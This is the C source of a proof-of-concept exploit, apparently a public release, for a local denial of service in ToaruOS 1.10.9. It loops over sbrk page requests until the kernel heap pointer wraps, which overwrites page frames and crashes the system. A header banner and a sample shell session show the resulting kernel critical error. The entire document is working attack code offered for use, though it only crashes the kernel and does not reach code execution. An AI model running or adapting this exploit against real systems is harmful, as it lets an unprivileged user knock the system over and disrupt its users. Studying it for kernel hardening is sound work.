/*
 *  The Mickey Mouse Hacking Squadron proudly presents
 *
 *     ToaruOS 1.10.9 sbrk local denial of service
 *
 *                   .-"""-.
 *                  /  . -  \
 *                  \       /
 *            .-""-.,:.-_-.<
 *           /    _; , / ).|
 *           \  ; / `  `"  '\
 *            '.-| ;-.____, |             .,
 *                \ `._~_/ /             /"/
 *   ,.           /`-.__.-'\`-._     ,",' ;
 *   \"\         / /|   o   \._ `-._; /  ./-.
 *    ; ';,     / / |    `__ \ `-.,( /  //.-'
 *   :\  \\;_.-" ;  |.-"`    ``\    /-. /.-'
 *    :\  .\),.-'  /      }{    |   '..'
 *      \ .-\      |          , /
 *       '..'      ;'        , /
 *                ( __ `;--;'__`)
 *                 `//'`    `||`
 *                _//        ||
 *        .-"-._,(__)      .(__).-""-.
 *       /          \     /           \
 *       \          /     \           /
 *        `'--=="--`       `--""==--'`
 *
 *  local@livecd ~$ gcc kowasu-sbrk.c -o kowasu-sbrk
 *  local@livecd ~$ whoami
 *  local
 *  local@livecd ~$ ./kowasu-sbrk
 *  [0000000294.562:kernel/mem/mem.c:200] CRITICAL: System claims to be out of
 *                                        usable memory, which means we
 *                                        probably overwrote the page frames.
 */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

#define PAGE_SIZE 4096

int main(void)
{
	uintptr_t p;

	printf("[ ] Triggering sbrk wrap denial of service...\n");

	do {
		p = (uintptr_t)sbrk(PAGE_SIZE);
		if (p % 0x10000000 == 0)
			printf("    %p\n", p);

		/* The last page needs to make ensure that we wrap
		 * image.heap_actual first.
		 * We can do this by requesting < PAGE_SIZE once, and this
		 * will overwrite the page frames, causing a critical.
		 *
		 * Doesn't seem like we can control/stop this and exploit.
		 */
		if (p == 0xFFFFE000) {
			p = (uintptr_t)sbrk(42);
			break;
		}
	} while (1);
}
